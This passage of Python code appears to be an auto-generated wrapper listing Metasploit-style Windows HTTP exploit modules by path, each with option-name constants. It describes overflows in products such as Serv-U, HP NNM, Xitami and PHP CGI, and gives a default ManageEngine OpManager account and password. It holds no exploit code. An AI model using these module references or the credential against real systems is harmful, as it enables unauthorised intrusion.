			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_privatewire_gateway(object):
		"""
		
          This exploits a buffer overflow in the ADMCREG.EXE used
        in the PrivateWire Online Registration Facility.
      
		"""

		path = 'windows/http/privatewire_gateway'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			required_PATH = 'PATH'

	class windows_http_servu_session_cookie(object):
		"""
		
          This module exploits a buffer overflow in Rhinosoft Serv-U 9.0.0.5.
        Sending a specially crafted POST request with an overly long session cookie
        string, an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/http/servu_session_cookie'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_http_hp_nnm_nnmrptconfig_nameparams(object):
		"""
		
        This module exploits a vulnerability in HP NNM's nnmRptConfig.exe.
        A remote user can send a long string data to the nameParams parameter via
        a POST request, which causes an overflow on the stack when function
        ov.sprintf_new() is used, and gain arbitrary code execution.'
      
		"""

		path = 'windows/http/hp_nnm_nnmrptconfig_nameparams'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_http_hp_pcm_snac_update_certificates(object):
		"""
		
        This module exploits a path traversal flaw in the HP ProCurve Manager SNAC Server. The
        vulnerability in the UpdateCertificatesServlet allows an attacker to upload arbitrary
        files, just having into account binary writes aren't allowed. Additionally, authentication
        can be bypassed in order to upload the file. This module has been tested successfully on
        the SNAC server installed with HP ProCurve Manager 4.0.
      
		"""

		path = 'windows/http/hp_pcm_snac_update_certificates'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_xitami_if_mod_since(object):
		"""
		
        This module exploits a stack buffer overflow in the iMatix Corporation
        Xitami Web Server. If a malicious user sends an	If-Modified-Since
        header containing an overly long string, it may be possible to
        execute a payload remotely. Due to size constraints, this module uses
        the Egghunter technique.
      
		"""

		path = 'windows/http/xitami_if_mod_since'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_http_manage_engine_opmanager_rce(object):
		"""
		
        This module exploits a default credential vulnerability in ManageEngine OpManager, where a
        default hidden account "IntegrationUser" with administrator privileges exists. The account
        has a default password of "plugin" which can not be reset through the user interface. By
        log-in and abusing the default administrator's SQL query functionality, it's possible to
        write a WAR payload to disk and trigger an automatic deployment of this payload. This
        module has been tested successfully on OpManager v11.5 and v11.6 for Windows.
      
		"""

		path = 'windows/http/manage_engine_opmanager_rce'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			FileDropperDelay = 'FileDropperDelay'

	class windows_http_easyfilesharing_seh(object):
		"""
		
        This module exploits a SEH overflow in the Easy File Sharing FTP Server 7.2 software.
      
		"""

		path = 'windows/http/easyfilesharing_seh'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_http_ektron_xslt_exec_ws(object):
		"""
		 Ektron 8.5, 8.7 <= sp1, 9.0 < sp1 have
vulnerabilities in various operations within the ServerControlWS.asmx
web services. These vulnerabilities allow for RCE without authentication and
execute in the context of IIS on the remote system.
      
		"""

		path = 'windows/http/ektron_xslt_exec_ws'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_HTTP_DELAY = 'HTTP_DELAY'
			required_TARGETURI = 'TARGETURI'
			required_TARGETOP = 'TARGETOP'

	class windows_http_shoutcast_format(object):
		"""
		
          This module exploits a format string vulnerability in the
        Nullsoft SHOUTcast server for Windows. The vulnerability is
        triggered by requesting a file path that contains format
        string specifiers. This vulnerability was discovered by
        Tomasz Trojanowski and Damian Put.
      
		"""

		path = 'windows/http/shoutcast_format'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_apache_mod_rewrite_ldap(object):
		"""
		
        This module exploits the mod_rewrite LDAP protocol scheme handling
        flaw discovered by Mark Dowd, which produces an off-by-one overflow.
        Apache versions 1.3.29-36, 2.0.47-58, and 2.2.1-2 are vulnerable.
        This module requires REWRITEPATH to be set accurately. In addition,
        the target must have 'RewriteEngine on' configured, with a specific
        'RewriteRule' condition enabled to allow for exploitation.

        The flaw affects multiple platforms, however this module currently
        only supports Windows based installations.
      
		"""

		path = 'windows/http/apache_mod_rewrite_ldap'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			required_REWRITEPATH = 'REWRITEPATH'

	class windows_http_nowsms(object):
		"""
		
          This module exploits a stack buffer overflow in Now SMS/MMS Gateway v2007.06.27.
        By sending a specially crafted GET request, an attacker may be able to execute
        arbitrary code.
      
		"""

		path = 'windows/http/nowsms'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_sws_connection_bof(object):
		"""
		
        This module exploits a vulnerability in Simple Web Server 2.2 rc2. A remote user
        can send a long string data in the Connection Header to causes an overflow on the
        stack when function vsprintf() is used, and gain arbitrary code execution. The
        module has been tested successfully on Windows 7 SP1 and Windows XP SP3.
      
		"""

		path = 'windows/http/sws_connection_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_php_apache_request_headers_bof(object):
		"""
		
          This module exploits a stack based buffer overflow in the CGI version of PHP
        5.4.x before 5.4.3. The vulnerability is due to the insecure handling of the
        HTTP headers.

          This module has been tested against the thread safe version of PHP 5.4.2,
        from "windows.php.net", running with Apache 2.2.22 from "apachelounge.com".
      
		"""

		path = 'windows/http/php_apache_request_headers_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
